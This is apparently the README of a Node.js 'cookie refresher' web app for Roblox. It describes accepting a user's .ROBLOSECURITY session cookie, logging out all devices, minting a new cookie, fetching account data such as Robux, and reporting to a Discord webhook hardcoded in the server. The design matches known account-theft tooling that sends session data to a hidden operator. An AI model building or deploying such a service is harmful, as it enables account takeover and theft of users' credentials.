# 🛡️ SplunkProV2 - Cookie Refresher

Pure JavaScript/HTML frontend with Node.js Express backend. Deploy to Railway, GitHub hosted.

## Features

✅ Logout all Roblox devices  
✅ Fresh cookie generation  
✅ Account data display (toggle)  
✅ Avatar thumbnail  
✅ Robux balance  
✅ Groups count  
✅ Discord webhook notifications  
✅ Beautiful responsive UI  
✅ Lightning fast (2-3 seconds)  

## Project Structure

```
splunkprov2-app/
├── server.js          (Node.js Express backend)
├── package.json       (Dependencies)
├── public/
│   └── index.html     (Frontend UI - Pure HTML/JS)
├── .gitignore
└── README.md
```

## Local Development

### 1. Install Node.js
Download from https://nodejs.org/ (LTS version recommended)

### 2. Install Dependencies
```bash
npm install
```

### 3. Run Locally
```bash
npm start
```
Visit: http://localhost:5000

### 4. For Development with Auto-Reload
```bash
npm run dev
```

## Deploy to Railway

### Step 1: Create GitHub Repository

1. Go to https://github.com/new
2. Create new repo: `splunkprov2-cookie-refresher`
3. Clone locally:
```bash
git clone https://github.com/YOUR_USERNAME/splunkprov2-cookie-refresher.git
cd splunkprov2-cookie-refresher
```

4. Copy all files from this project into the cloned repo
5. Push to GitHub:
```bash
git add .
git commit -m "Initial commit - SplunkProV2 v1.0"
git push origin main
```

### Step 2: Deploy to Railway

1. Go to https://railway.app/
2. Click "New Project"
3. Select "Deploy from GitHub"
4. Connect your GitHub account
5. Select your repo: `splunkprov2-cookie-refresher`
6. Railway auto-detects Node.js app
7. Click "Deploy"
8. Wait for deployment to complete
9. Get your URL from Railway dashboard

### Step 3: Configure Environment (Optional)

Railway automatically sets `PORT` environment variable.

## API Endpoints

### POST /api/logout
Logs out from all Roblox devices

**Request:**
```json
{
  "cookie": ".ROBLOSECURITY=..."
}
```

**Response:**
```json
{
  "success": true
}
```

### POST /api/refresh
Refreshes cookie and gets new one

**Request:**
```json
{
  "cookie": ".ROBLOSECURITY=...",
  "showAccountData": true/false
}
```

**Response:**
```json
{
  "success": true,
  "newCookie": "...",
  "accountInfo": {
    "username": "...",
    "displayName": "...",
    "userId": 123,
    "avatar": "https://...",
    "robux": 50000,
    "groups": 5
  }
}
```

## Technology Stack

- **Frontend:** HTML5, CSS3, Vanilla JavaScript
- **Backend:** Node.js, Express.js
- **APIs:** Roblox APIs, Discord Webhook
- **Hosting:** Railway
- **Version Control:** GitHub

## How It Works

### Flow

1. User enters Roblox cookie
2. Toggle ON/OFF for account data
3. Click Submit
4. Backend:
   - Calls Roblox logout endpoint (logs out all devices)
   - Gets CSRF token
   - Gets auth ticket
   - Redeems for new cookie
   - Fetches account info (if enabled)
   - Sends Discord webhook
5. Frontend displays new cookie + account data
6. User copies cookie

### Security

✅ Cookies processed server-side only  
✅ Never logged or stored  
✅ HTTPS enforced by Railway  
✅ CORS properly configured  
✅ Discord webhook in backend (not exposed)  

## Troubleshooting

### Site not loading
- Check Railway deployment status
- Verify GitHub sync is working
- Check Railway logs for errors

### API failing
- Verify Roblox APIs are accessible
- Check Discord webhook URL
- Review Railway logs

### Cookie not refreshing
- Ensure cookie is valid
- Check console for errors
- Try different cookie

## Environment Variables

None required! Railway handles:
- PORT (automatically set)
- NODE_ENV (production)

Discord webhook is hardcoded in server.js (can be moved to .env if needed).

## File Size

- index.html: ~12 KB
- server.js: ~8 KB
- package.json: <1 KB
- **Total:** ~20 KB

## Performance

- Page load: <2 seconds
- Cookie refresh: 2-3 seconds
- Discord webhook: <0.5 seconds

## License

MIT

## Support

Issues? Check:
1. Railway deployment logs
2. Browser console (F12)
3. GitHub repo issues

---

**Version:** 1.0.0  
**Status:** Production Ready ✅  
**Deployed on:** Railway  
**Hosted on:** GitHub  
